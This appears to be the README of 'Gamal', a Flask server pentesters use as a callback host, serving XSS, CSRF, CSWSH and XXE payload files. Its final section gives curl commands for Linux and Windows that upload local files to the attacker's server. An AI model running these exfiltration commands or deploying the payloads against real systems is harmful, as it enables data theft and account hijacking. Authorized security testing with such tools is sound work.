# Gamal
A tiny flask app for helping pentesters, red-teamers and bug hunters in data exfileration, SSRF, XSS, Session Hijacking, Session Riding and Cookie Thieve.

## Install & usage:

```bash
cd /opt
git clone github.com/Fadavvi/Gamal
cd Gamal
python3 -m pip install flask
python3 gamal.py
```  

Default configuration: IP binding: `0.0.0.0`, Port: `1337`, Log: `gamal.log`, Canary-String: `booqbooqGamal`

or

`python3 gamal.py --ip <IPADDR> --port <PORTNUM> --log <LOGPATH> --canary <YourCanaryString> [--cert <FullChain> --key <PrivateKey>]`

Then you can use your IP & Port in your SSRF XSS | XXE | Open-Redirect | Etc. payloads.

***Note:*** Add your files in `/f` folder ==>  `http://IP:PORT/f/<Your-FileName>` 

## Paylods:
`/f/xss.js` XSS Sample function

`/f/CORS.html` CORS sample script

`/f/CSRF.html` CSRF sample page

`/f/CSWSH.html` Cross-Site WebSocket Hijacking (CSWSH) script

`/f/meta.jpg` XSS in Meta-data 

`/f/EBXXE.dtd` XXE .dtd sample file

`/f/xxe1.svg` and `/f/xxe2.svg` XXE in SVG file

## Data exfiltration

Linux / MacOS:

`curl -k -F "file=@<PathToYourFile>" https://<GamalIP>:<GamalPort>/e/upload`

Windows:

`Remove-Item alias:curl; curl -k -F "file=@C:\<PathToYourFile>" https://<GamalIP>:<GamalPort>/e/upload`